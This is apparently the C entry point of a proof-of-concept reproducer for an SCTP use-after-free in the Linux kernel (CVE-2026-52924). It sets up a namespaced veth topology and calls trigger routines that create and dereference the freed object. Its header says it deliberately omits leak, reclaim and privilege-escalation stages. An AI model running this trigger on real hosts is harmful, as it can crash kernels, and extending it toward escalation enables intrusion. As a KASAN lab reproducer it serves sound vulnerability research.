/*
 * CVE-2026-52924 UAF-only reproduction entry point.
 *
 * The SCTP packet/state-machine implementation is derived from the source
 * credited in LICENSE and README.md.  This entry point deliberately omits
 * address disclosure, reclaim, forged objects and privilege escalation.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "trigger_poc.h"

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static void pin_to_cpu0(void)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0)
		die("sched_setaffinity cpu0");
}

int main(int argc, char **argv)
{
	struct sctp_trigger trigger;
	struct utsname uts;

	if (argc != 1) {
		fprintf(stderr, "usage: %s\n", argv[0]);
		return 2;
	}
	if (geteuid() != 0) {
		fprintf(stderr,
			"run as root only inside an isolated disposable KASAN VM\n");
		return 2;
	}
	if (uname(&uts) < 0)
		die("uname");
	printf("CVE52924_POC_BEGIN release=%s uid=%u euid=%u\n",
	       uts.release, (unsigned int)getuid(), (unsigned int)geteuid());
	fflush(stdout);

	/* Root is required only to prepare a private lab network namespace.
	 * No AppArmor profile transition or CVE-2026-90231 path is used. */
	if (unshare(CLONE_NEWNET) < 0)
		die("unshare network namespace");
	setup_veth_sctp_topology();
	pin_to_cpu0();

	if (sctp_trigger_prepare(&trigger) < 0)
		die("prepare SCTP stale-cookie sequence");
	if (sctp_trigger_create_uaf(&trigger) < 0)
		die("create SCTP out_curr UAF");
	if (sctp_trigger_flush(&trigger) < 0)
		die("trigger stale out_curr load");

	fputs("CVE52924_POC_RETURNED_WITHOUT_KASAN\n", stderr);
	return 1;
}
